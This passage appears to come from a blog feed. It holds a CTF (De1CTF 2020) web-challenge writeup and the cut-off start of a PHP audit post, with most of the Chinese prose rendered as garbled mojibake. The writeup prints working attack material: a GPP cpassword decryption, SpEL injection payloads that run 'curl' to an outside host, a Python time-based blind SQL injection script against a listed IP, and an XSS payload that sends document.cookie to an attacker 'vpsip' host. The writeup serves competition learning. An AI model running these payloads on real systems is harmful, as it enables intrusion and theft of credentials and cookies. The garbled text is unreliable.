alt></p><p>è„šæœ¬åˆ—å‡ºçš„ä¿¡æ¯ä¸­æœ‰ä¸€ä¸ªåŸŸç”¨æˆ·åå­—å¾ˆæ•æ„Ÿã€‚HintZip_Pass<br>ä¸‹é¢å¼€å§‹æ‰‹åŠ¨ä¿¡æ¯æ”¶é›†</p><p>å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://wh0ale.github.io/2018/12/19/2018-12-19-%E5%9F%9F%E6%B8%97%E9%80%8F/" target="_blank" rel="noopener">åŸŸæ¸—é€æ€»ç»“</a></p><blockquote><p>åŸŸï¼ˆDomainï¼‰æ˜¯ç›¸å¯¹å·¥ä½œç»„ï¼ˆWorkgroupï¼‰çš„æ¦‚å¿µï¼Œå½¢è±¡çš„è¯´ï¼ŒåŸŸå°±åƒä¸­å¤®é›†æƒï¼Œç”±ä¸€å°æˆ–æ•°å°åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼‰ç®¡ç†åŸŸå†…çš„å…¶ä»–è®¡ç®—æœº</p></blockquote><p>æ‰€ä»¥åŸŸæ¸—é€çš„æ ¸å¿ƒæ˜¯é€šè¿‡å¯æ§çš„åŸŸç”¨æˆ·ï¼Œæ”¶é›†å…¶ä¸­çš„å¯ç”¨ä¿¡æ¯ï¼Œè¿›ä¸€æ­¥åˆ©ç”¨å…¶ä»–æ¼æ´å‘å±•æ›´å¤šåŸŸç”¨æˆ·ã€‚æœ€åèƒ½æ‹¿åˆ°ç®¡ç†å‘˜çš„å“ˆå¸Œï¼ŒåŸºæœ¬å°±ç®—æ¸—é€å®Œæ•´äº†ã€‚</p><p>ipconfig /allå¯ä»¥ç¡®è®¤å¤„äºåŸŸç®¡ç†æ¨¡å¼ä¸­</p><pre><code>PS C:\Users\Public&gt; net user /domainnet user /domainThe request will be processed at a domain controller for domain De1CTF2020.lab.User accounts for \\dc.De1CTF2020.lab-------------------------------------------------------------------------------Administrator            De1CTF1                  de1ta                    Guest                    HintZip_Pass             krbtgt                   web                      The command completed successfully.</code></pre><p>æŸ¥è¯¢åŸŸç”¨æˆ·æ—¶ä¹Ÿèƒ½å¾—åˆ°è·ŸwinPEASä¸€æ ·çš„å…³äºåŸŸç”¨æˆ·çš„ä¿¡æ¯ã€‚<br>å°è¯•net use</p><pre><code>PS C:\&gt; net usenet useNew connections will be remembered.Status       Local     Remote                    Network-------------------------------------------------------------------------------OK                     \\192.168.0.12\Hint       Microsoft Windows NetworkThe command completed successfully.</code></pre><p>å‘ç°<code>\\192.168.0.12\Hint</code>ã€‚ä¸”ç”±äºæˆ‘ä»¬åˆšåˆšæ˜¯å»ºç«‹çš„IPCç©ºé“¾æ¥ã€‚å› æ­¤å¯ä»¥æ— éœ€ç”¨æˆ·åå¯†ç è®¿é—®å®ƒã€‚(ä¸è¿‡æˆ‘åæ¥å†çœ‹æ—¶å‘ç°è¿™ä¸ªåœ°å€æ²¡äº†)<br><code>net view\\192.168.0.12\</code>ä¹Ÿèƒ½å‘ç°æœ‰Hint,SYSVOL,NETLOGINå‡ ä¸ªç›®å½•</p><p>ç›´æ¥pushd<code>\\192.168.0.12\Hint</code>è¿›å…¥filesystem.å‘ç°äº†ä¸€ä¸ªflag1_and_flag2hint.zip</p><p>åŸºäºæˆ‘ä»¬ç©çš„æ˜¯å¤šäººæ¸—é€ã€‚æ‰€ä»¥æœ€å¥½æŠŠå®ƒcopyåˆ°è‡ªå·±ç§å¯†çš„ä½ç½®ã€‚æˆ–è€…æŠŠå®ƒä»¥å…¶ä»–æ–‡ä»¶æ ¼å¼ä¿å­˜ä¸‹æ¥ã€‚(å› ä¸ºæˆ‘åœ¨æ€è€ƒå¦‚ä½•æŠŠå®ƒæ‹¿ä¸‹æ¥æ—¶åˆšå¥½åœ¨èšå‰‘çš„shellé‡Œå‘ç°åˆ«äººçš„zipæ–‡ä»¶2333)<br>ç›´æ¥ä¸‹å¥½åˆ«äººçš„zipå,ç°åœ¨è¦ä¸€ä¸ªå¯†ç </p><p>è¿™é‡Œå°±ä½“ç°å‡ºä¿¡æ¯æ”¶é›†çš„é‡è¦æ€§äº†ã€‚å› ä¸ºæˆ‘ä»¬ä¹‹å‰å‘ç°å¯ä»¥ç”¨çš„æ–‡ä»¶å¤¹é™¤äº†Hintè¿˜æœ‰SYSVOL.æ‰€ä»¥æˆ‘é€‰æ‹©ç™¾åº¦<code>åŸŸæ¸—é€ SYSVOL</code><br>å¾—åˆ°è¿™ç¯‡æ–‡ç« <a href="https://xz.aliyun.com/t/1653/" target="_blank" rel="noopener">åŸŸæ¸—é€â€”â€”åˆ©ç”¨SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç </a><br>åœ¨åŸŸä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªé»˜è®¤çš„å…±äº«è·¯å¾„<code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code></p><blockquote><p>åŸŸç®¡ç†å‘˜åœ¨ä½¿ç”¨ç»„ç­–ç•¥æ‰¹é‡ç®¡ç†åŸŸå†…ä¸»æœºæ—¶ï¼Œå¦‚æœé…ç½®ç»„ç­–ç•¥çš„è¿‡ç¨‹ä¸­éœ€è¦å¡«å…¥å¯†ç ï¼Œé‚£ä¹ˆè¯¥å¯†ç ä¼šè¢«ä¿å­˜åˆ°å…±äº«æ–‡ä»¶å¤¹\SYSVOLä¸‹ï¼Œé»˜è®¤æ‰€æœ‰åŸŸå†…ç”¨æˆ·å¯è®¿é—®ï¼Œè™½ç„¶å¯†ç é€šè¿‡AES 256è¿›è¡ŒåŠ å¯†ï¼Œå¯†é’¥æ˜¯å…¬å¼€åœ¨å¾®è½¯å®˜ç½‘çš„ã€‚</p></blockquote><p>å‚è€ƒè¿™ç¯‡æ–‡ç« <a href="https://www.cnblogs.com/zpchcbd/p/11703687.html" target="_blank" rel="noopener">åŸŸæ¸—é€ï¼šGPP(Group Policy Preferences)æ¼æ´</a><br>å¯ä»¥ä½¿ç”¨<code>dir /s /a \\åŸŸæ§IP\SYSVOL\*.xml</code>æ¥å°è¯•åˆ—å‡ºå­˜åœ¨çš„xml<br><code>dir /s /a \\192.168.0.12\SYSVOL\*.xml</code><br>å¾—åˆ°å®Œæ•´è·¯å¾„åè¯»å–ã€‚è¿™é‡Œè¯•äº†ä¸‹typeä¸è¡Œï¼Œgcä¸è¡Œã€‚ç”¨moreæˆäº†<br><code>more \\192.168.0.12\SYSVOL\De1CTF2020.lab\Policies\{B1248E1E-B97D-4C41-8EA4-1F2600F9264B}\Machine\Preferences\Groups\Groups.xml</code></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;HintZip_Pass&quot; image=&quot;2&quot; changed=&quot;2020-04-15 14:43:23&quot; uid=&quot;{D33537C1-0BDB-44B7-8628-A6030A298430}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot; changeLogon=&quot;1&quot; noChange=&quot;0&quot; neverExpires=&quot;0&quot; acctDisabled=&quot;0&quot; userName=&quot;HintZip_Pass&quot;/&gt;&lt;/User&gt;&lt;/Groups&gt;   </code></pre><p>è¿™ä¸ªcpasswordæ°å¥½æ˜¯å±äºHintZip_Passçš„ã€‚é‚£ä¹ˆæ ¹æ®ä¸Šæ–‡ï¼Œç”±äºç§é’¥æš´éœ²ã€‚åªè¦çŸ¥é“å…¬é’¥cpasswordå³å¯ç ´è§£ã€‚</p><p>kaliæœ‰ç°æˆçš„gpp-decrypt ç›´æ¥ç”¨<code>gpp-decrypt uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08</code>å°±æˆã€‚<br>å¾—åˆ°å¯†ç åè§£å‡ºzipæ–‡ä»¶<br><img src="/2020/05/04/De1CTF2020writeup/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿™é¢˜åšå®Œååç»­æç¤ºçœ‹éƒ½ä¸æƒ³çœ‹äº†.çœŸçš„æ˜¯éš¾.ä¸è¿‡æ”¶è·ç‰¹æŒºå¤šçš„ã€‚<br>(ä»¥åæˆ‘ä¸€å®šå¥½å¥½å­¦æ¸—é€.jpg)</p><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>æ˜¨å¤©æ¯”èµ›æ—¶æ²¡åšå‡ºæ¥â€¦ç¬¬äºŒå¤©zjyå¸ˆå‚…æ„é€ å‡ºäº†payloadã€‚æ‰æ„Ÿæ…¨è‡ªå·±è¿˜æ˜¯å¤ªèœäº†ã€‚</p><p>æŠ“åŒ…å°±èƒ½å¾—åˆ°<code>spel/calc?calc=</code>çš„è·¯ç”±<br>æç¤ºçš„è¿™ä¹ˆæ˜æ˜¾ï¼Œåªèƒ½æ˜¯spELçš„è¡¨è¾¾å¼æ³¨å…¥äº†ã€‚<br>ä¸è¿‡ç®€å•FUZZä¸€ä¸‹ï¼Œå‘ç°æœä¸å…¶ç„¶æœ‰wafã€‚<br>å¤§æ¦‚æœ‰è¿™äº›å…³é”®å­—å§ï¼Œ<br><code>#,getClass, T( ,java.lang, new ,String,</code><br>æƒ³è¦ç›´æ¥RCEå½“ç„¶ä¸è¡Œã€‚æ‰€ä»¥å¾—æ„é€ </p><p>ç¬¬ä¸€æƒ³æ³•æ˜¯æŸ¥èµ„æ–™ï¼Œæ‰¾åˆ°ä¸å°‘å¸ˆå‚…åšcode-breakingæ—¶ç”¨åå°„è¿›è¡ŒspEL-RCEçš„payload<br>åŸæœ¬æ˜¯</p><pre><code class="java">Runtime.getRuntime().exec()</code></pre><p>é€šè¿‡åå°„ï¼Œæˆ‘ä»¬å°±èƒ½å·§å¦™åˆ©ç”¨åå°„æ„é€ å‡ºç±»ä¸æ–¹æ³•ã€‚ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ã€‚</p><pre><code class="java">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),&quot;curl xxxx&quot;);</code></pre><p>ä½†æ˜¯è¿™é‡ŒString,getClassæ²¡äº†ã€‚ä¸è¿‡ä¹Ÿæœ‰æ–¹æ³•ç»•è¿‡<br>ä½¿ç”¨<code>&#39;&#39;[&#39;class&#39;]</code>æ•°ç»„ç›´æ¥ç»•<br>è¿™æ˜¯å‚è€ƒSEAM2.3.1çš„ä¸€ä¸ªååºåŒ–payloadçš„æ”¹æ³•</p><pre><code class="java">&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15].invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7].invoke(null),&#39;curl 172.17.0.1:9898&#39;)```ç„¶è€Œpayloadæ‰“äº†ä¸€å‘å‘ç°æŠ¥é”™ã€‚ç„¶åå°±æ— è¯­äº†ã€‚è¿™æ—¶æƒ³èµ·æ¥,æŠ“åŒ…æ—¶å‘ç°headeré‡Œæœ‰openrasp,ä¼°è®¡æ˜¯ç›´æ¥ä»åº•å±‚æŠŠruntimeä¹‹ç±»çš„ç»™hookæ‰äº†ã€‚ç„¶åéƒå¸ˆå‚…è¯´ä¸ç”¨æ‰§è¡Œå‘½ä»¤ä¹Ÿèƒ½è¯»ã€‚ä»”ç»†æƒ³æŒºæœ‰é“ç†çš„,ä¸ç„¶æ²¡å¿…è¦ç›´æ¥å‘Šè¯‰æˆ‘ä»¬flagåœ¨æ ¹ç›®å½•ä½†æ˜¯ç¡®å®javaå¤ªèœäº†...ä¸‹é¢æ˜¯é˜Ÿå‹æ•™æˆ‘çš„æ–¹æ³•ã€‚```javaNew java.io.BufferedReader(New java.io.FileReader(&quot;/flag&quot;)).readLine()</code></pre><p>åŸæ¥åœ¨spELé‡Œæ˜¯ä¸åŒºåˆ†å…³é”®å­—å¤§å°å†™çš„â€¦é‚£ç›´æ¥ç”¨javaèƒ½è¯»æ–‡ä»¶çš„ç±»æ¥å°±è¡Œäº†â€¦<br><a href="https://juejin.im/post/5cdc21626fb9a0320c5ad583" target="_blank" rel="noopener">Java è¯»æ–‡ä»¶çš„5ç§æ–¹å¼</a><br>åŒç†ä¹Ÿå¯</p><pre><code class="java">New java.util.Scanner(New java.io.File(&quot;/flag&quot;)).nextLine()</code></pre><p><img src="/2020/05/04/De1CTF2020writeup/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>javaæ˜¯çœŸçš„è¦å¥½å¥½ç ”ç©¶ä¸‹äº†</p><p>ps:åœ¨æ¨é€é‡Œçœ‹åˆ°ä¸€ç¯‡æ–‡ç« æ°å¥½æåˆ°äº†De1è¿™é¢˜ã€‚æ‰å‘ç°dalaoç›´æ¥bypass openraspè¿›è¡ŒRCEäº†â€¦<br>å‚è€ƒ:<a href="https://landgrey.me/blog/15/" target="_blank" rel="noopener">bypass openrasp SpEL RCE çš„è¿‡ç¨‹åŠæ€è€ƒ</a><br>åŸæ¥æ·±æŒ–spELçš„åº•å±‚è§£ææºç ï¼Œå¯å‘ç°ç©ºå­—ç¬¦èƒ½ç›´æ¥bypass.æ‰€ä»¥ï¼Œåˆå¯ä»¥äº§ç”Ÿå®Œå…¨ä¸ä¾èµ–newçš„å®ä¾‹åŒ–æ–¹æ³•.ç›´æ¥ç©ºå­—ç¬¦æ’è¿›è¢«è¿‡æ»¤çš„<code>T(</code>ä¸­å³å¯<br><img src="/2020/05/04/De1CTF2020writeup/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç”šè‡³è¿›ä¸€æ­¥ï¼Œè¿˜èƒ½é€šè¿‡ååºåˆ—åŒ–çš„æ€æƒ³,ä¸æ˜¾ç¤ºçš„åŠ è½½æ¶æ„ç±»,è¾¾æˆRCEã€‚<br>orzåŸæ¥javaçš„å§¿åŠ¿è¿™ä¹ˆå¤šçš„ä¹ˆâ€¦</p><h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><p>å¯ä»¥ä»»æ„ç™»å½•<br>member.phpæ³¨é‡Šä¸­æœ‰ orderby<br>æµ‹äº†ä¸‹å‘ç°åº”è¯¥æ˜¯order by åçš„è¯­å¥<br>å¼€å§‹ä»¥ä¸ºåªèƒ½æ¥limit<br>é‚£æœ‰ä¸”ä»…æœ‰<code>procedure analyse</code>ä¸€ç§æ–¹æ³•<br>ä½†æŠ¥é”™å‡½æ•°éƒ½æ²¡äº†ã€‚å»¶æ—¶å»¶ä¸äº†ã€‚ç‰ˆæœ¬é—®é¢˜åªèƒ½ç”¨5.6ä»¥ä¸‹çš„å‡½æ•°ã€‚çœŸå¿ƒæ²¡æ‰‹æ®µäº†<br>æˆ‘æœ‰ç½ªï¼Œè¿™ç§éš¾åº¦çš„sqlè¢«å¡ä½ã€‚è¯¥æ‰“ã€‚</p><p>ç›´æ¥and åˆ†æµæˆ‘å±…ç„¶ä¼šå¿˜äº†ã€‚</p><pre><code class="python">import requestsimport urllib.parseurl=&#39;http://134.175.185.244/member.php?orderby=&#39;flag=&quot;&quot;for i in range(1,30):    print(i)    a=0    for str1 in &quot;qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890,&quot;:        payload = &quot;and case when (substr((select password from member),&quot;+str(i)+&quot;,1)=&#39;&quot;+str1+&quot;&#39;) then (benchmark(500000,sha(1))) else 1 end&quot;        payload = urllib.parse.quote(payload)        try:            r = requests.get(url + payload, timeout=2.5)        except requests.exceptions.ReadTimeout:            flag+=str1            print(flag)            a=1            break    if a==0:        break</code></pre><p>æ±‚å¾—å¯†ç è§£å‡ºæ¥å¾—åˆ°<br>goodlucktoyou</p><p>è¿›å»åä¸€å¼€å§‹å‘ç°æœ‰ä¸€ä¸ªselect.phpä»»æ„è¯»æ–‡ä»¶çš„åŠŸèƒ½ä¸admin.phpç»™å‡ºçš„phpinfo,ä½†æ˜¯è¯»å®Œæºç åå‘ç°å±…ç„¶ä½¿ç”¨äº†Mincludeè¿™ä¸ªå‡½æ•°æ¥åŒ…å«ã€‚phpinfoé‡Œä¹Ÿèƒ½çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„soæ–‡ä»¶â€¦.æ‰€ä»¥è¿™é¢˜çœŸé¢ç›®æ˜¯<del>WEB</del>-PWN,åº”è¯¥æ˜¯é€šè¿‡è°ƒè¿™ä¸ªsoæ¥æº¢å‡ºæ‰§è¡Œæ ¹ç›®å½•çš„readflagâ€¦</p><p>ç„¶è€Œæ¯”èµ›å·²ç»å¿«ç»“æŸäº†ï¼Œç­‰äºç™½ç»™ã€‚</p><h2 id="AnimalCrossing"><a href="#AnimalCrossing" class="headerlink" title="AnimalCrossing"></a>AnimalCrossing</h2><p>è¿™é¢˜ç­‰wpå§â€¦è€å®è¯´ä¸æƒ³å¤ç°äº†ã€‚å› ä¸ºé¢˜ç›®å¾—åˆ°flagé™¤äº†è¦å¼¹adminçš„cookie,è¿˜è¦ä»adminç•Œé¢çš„å›¾ç‰‡è·å–ä¿¡æ¯â€¦<br>æ²¡è§è¿‡è¿™ä¹ˆç£¨äººçš„xss.</p><p>5.18å¤ç°:</p><p>ä»Šå¤©æ•´ç†ä»“åº“æ—¶å¶ç„¶å‘ç°De1CTFè¿™ä¸ªé¢˜æ˜¯æœ‰dockerç¯å¢ƒçš„ã€‚äºæ˜¯å°±èµ·äº†ä¸ªç¯å¢ƒå°è¯•å¤ç°ä¸‹ã€‚å‘ç°å­¦åˆ°äº†ä¸å°‘å§¿åŠ¿ã€‚</p><p>é¦–å…ˆç¬¬ä¸€æ­¥è‡ªç„¶æ˜¯åˆ©ç”¨é‚£ä¸ªå¯èƒ½è¾¾æˆxssçš„ç‚¹äº†ã€‚æœ¬é¢˜æ˜¯åœ¨è¿™ä¸ªurlä¸­çš„dataä½ç½®<br><img src="/2020/05/04/De1CTF2020writeup/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ä½†æ˜¯æ­¤å¤„self-xssçš„è¾¾æˆéƒ½ååˆ†å›°éš¾ã€‚å› ä¸ºä¸€æ–¹é¢å­˜åœ¨wafè¿‡æ»¤æ‰å­—ç¬¦(è¿™é‡Œå¦‚æœparseå¤±è´¥å›æ˜¾ä¹Ÿæ˜¯æŒ‰é‡åˆ°wafåˆ¤æ–­çš„,æ‰€ä»¥è¦æ³¨æ„è¯­æ³•çš„è§„èŒƒ)ã€‚åŒæ—¶è¿˜æœ‰ä¸ªCSP.<br><code>default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;object-src &#39;none&#39;;</code><br>å½“ç„¶è¿™ä¸ªCSPå¾ˆå¥½ç»•ã€‚ä½¿ç”¨locationè¿™ä¸€ç±»å‹çš„è·³è½¬å°±å¯ä»¥äº†ã€‚éš¾ç‚¹åœ¨äºç»•wafè¾¾æˆåé¢çš„jsä»£ç æ‰§è¡Œã€‚</p><p>çœ‹åˆ°skyå¸ˆå‚…çš„wpåæ‰æç„¶å¤§æ‚Ÿã€‚(è†œä¸€å¶é£˜é›¶å¸ˆå‚…,è‡ªå·±å¾ˆå¤šçŸ¥è¯†éƒ½æ˜¯ä»ä»–çš„æ–‡ç« é‚£å­¦æ¥çš„).åŸæ¥æ˜¯å¯ä»¥åˆ©ç”¨jsçš„ä¸€ä¸ªtrick,è€Œä¸”è‡ªå·±æ›¾ç»å¤§æ¦‚æ¥è§¦è¿‡ã€‚</p><p>å…ˆè§£é‡Šä¸‹è¿™é‡Œçš„xssæ‰§è¡Œ<br><img src="/2020/05/04/De1CTF2020writeup/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æˆ‘ä»¬çš„æ•°æ®å¯ä»¥ç›´æ¥é€šè¿‡urlä¸­dataå‚æ•°æ‹¼æ¥è¿›è¿™é‡Œçš„jsä»£ç ã€‚é¦–å…ˆè‡ªç„¶ä½¿ç”¨<code>1&#39;//</code>ä¿è¯ä»£ç è¯­æ³•çš„åˆæ³•æ€§ã€‚ä¹‹åè€ƒè™‘çš„å°±æ˜¯,æ€ä¹ˆæ ·åœ¨å•å¼•å·è·Ÿæ³¨é‡Šç¬¦ä¸­é—´è¿™éƒ¨åˆ†ä½¿ç”¨jsä»£ç ç»•è¿‡wafè¿›è¡Œxssã€‚<br>äºæ˜¯è¿™é‡Œå°±è¦æåˆ°jsçš„ä¸€ä¸ªtrickäº†ã€‚å…ˆè§£é‡Šä¸‹skyå¸ˆå‚…çš„payloadã€‚<br><img src="/2020/05/04/De1CTF2020writeup/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¯¹äºjsä¸­ä¸€ä¸ªå¯¹è±¡è€Œè¨€,å…¶<code>valueOf()</code>æ–¹æ³•ä¼šè¿”å›å¯¹è±¡æœ¬èº«ã€‚è€Œå½“æˆ‘ä»¬å°†å¯¹è±¡ä¸äºŒå…ƒè¿ç®—ç¬¦è¿›è¡Œæ“ä½œæ—¶,å°†ä¼šè°ƒç”¨valueofæ–¹æ³•ã€‚<br>é‚£ä¹ˆè¿™æ ·å°±ç®€å•äº†,åªè¦èƒ½æ§åˆ¶<code>valueOf()</code>æ–¹æ³•è¿”å›å€¼,å°±èƒ½æ‰§è¡Œä»»æ„jsä»£ç ã€‚<br>é‚£ä¹ˆæ­¤å¤„payloadå°±å¯ä»¥æ„é€ æˆ</p><pre><code class="javascript">&#39;+{&quot;valueOf&quot;:new &quot;&quot;.construcor.constructor(atob(&#39;base64xsspayload&#39;))}+1//</code></pre><p>ä½¿ç”¨<code>constructor</code>è·å–åˆ°åŒ¿åå‡½æ•°è¿™ä¸ªåœ¨nodejsé‡Œå·²ç»éå¸¸ç†Ÿæ‚‰äº†ã€‚åŒæ—¶è¿™é‡Œ<code>+1</code>å°±å¯ä»¥ç›´æ¥è§¦å‘<code>valueOf</code>.æœ€åæˆ‘ä»¬ä¸ºäº†ç»•è¿‡wafä½¿ç”¨å§base64ç»•è¿‡ã€‚</p><p>å½“ç„¶ä½¿ç”¨å…¶ä»–æ–¹æ³•éƒ½å¯ä»¥ã€‚æˆ‘çœ‹è§æ¦œä¸€çš„mslcpayloadå¤§æ¦‚ä¹Ÿæ˜¯ç”¨äºŒå…ƒè¿ç®—ç¬¦åŠ ä¸Šbase64paylaodè¾¾æˆçš„ã€‚åªä¸è¿‡ç”¨çš„æ˜¯jsä¼ªåè®®ã€‚å½¢å¼ä¸Šç®€å•äº†è®¸å¤š</p><pre><code>payload=javascript:{window.location.href=&quot;vpsip/?&quot;+document.cookie}data=1&#39;%2bopen(atob(&#39;base64encodepaylaod&#39;))//</code></pre><p>åé¢æ‰“ç»™adminæ”¶flag<br>å› ä¸ºdockerç¯å¢ƒä¸çŸ¥é“ä¸ºä»€ä¹ˆå†…ç½‘æœåŠ¡æ²¡èµ·æ¥,æ‰€ä»¥æ²¡æ³•ç»§ç»­å¤ç°äº†ã€‚åé¢å¤§è‡´çš„å†…å®¹å°±æ˜¯å‘ç°adminçš„é¡µé¢æœ‰ç…§ç‰‡,æ‰€ä»¥å¯ä»¥ä¸€ä¸ªä¸ªä¸‹ä¸‹æ¥æ‹¼å›¾å³å¯ã€‚(ç”¨åˆ°äº†ä¹‹å‰çš„pngbypassCSPçš„å†…å®¹)</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™æ¬¡æ¯”èµ›è¿˜æ˜¯å‡ ä¹å…¨ç¨‹è‡ªé—­ã€‚è™½ç„¶å¤§å®¶åº”è¯¥éƒ½å·®ä¸å¤šå§ã€‚è€Œä¸”æ²¡æƒ³åˆ°çš„æ˜¯è‡ªå·±å±…ç„¶æ˜¯WEBä¸»C,ä¼°è®¡ä»¥åä¹Ÿä¼šè¿™æ ·æ‰¿æ‹…èµ·æ¯”ä»¥å¾€æ›´å¤§çš„è´£ä»»äº†.å­¦é•¿ä»¬æ²¡æ‰“ï¼Œå°±åªèƒ½é è‡ªå·±ã€‚å¯èƒ½ä¸€ç›´ä»¥æ¥å¿ƒé‡Œè§‰å¾—æœ‰éƒç¦»æ­Œåœ¨,è¿™äº›é¢˜ç›®éƒ½ä¸æ˜¯äº‹çš„.ç„¶è€Œè¿™æ¬¡De1ç›´æ¥æ³¼äº†ä¸€å¤´å†·æ°´ï¼Œæé†’æˆ‘æœ€åè¿˜æ˜¯å¾—é è‡ªå·±ã€‚ç¡¬å®åŠ›æ‰æ˜¯ç‹é“ã€‚</p><p>é©¬ä¸Šç½‘é¼ä¹Ÿæ¥äº†ï¼Œè¿™æ®µæ—¶é—´äº‰å–æŠŠjavaå®‰å…¨èƒ½å…¥ä¸ªé—¨ï¼Œphpä»£å®¡è¿‡å®Œå§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-Audit-Labså®¡è®¡å­¦ä¹ </title>
      <link href="2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æ‰“ç®—åœ¨ä»£ç å®¡è®¡ä¸Šå…¥ä¸‹å‘ã€‚æœ¬æ¥æ‰¾äº†ä¸ªä¸çŸ¥åcmsæƒ³å®¡è®¡ä¸€ä¸‹çš„ã€‚å¶ç„¶é—´çœ‹åˆ°äº†æ˜Ÿç›Ÿç‹å¹ä¹‹å¸ˆå‚…åœ¨ç”¨php-audit-labsç»ƒå®¡è®¡,æ‰€ä»¥è‡ªå·±ä¹Ÿæ‰“ç®—ç»ƒä¸€ä¸‹å®¡è®¡çš„æŠ€æœ¯,æ¯•ç«Ÿè‡ªå·±å®¡è®¡åŠŸåŠ›å¤ªå·®äº†â€¦pç‰›ä¹Ÿæ›¾ç»è¯´è¿‡,ç»ƒä¹ 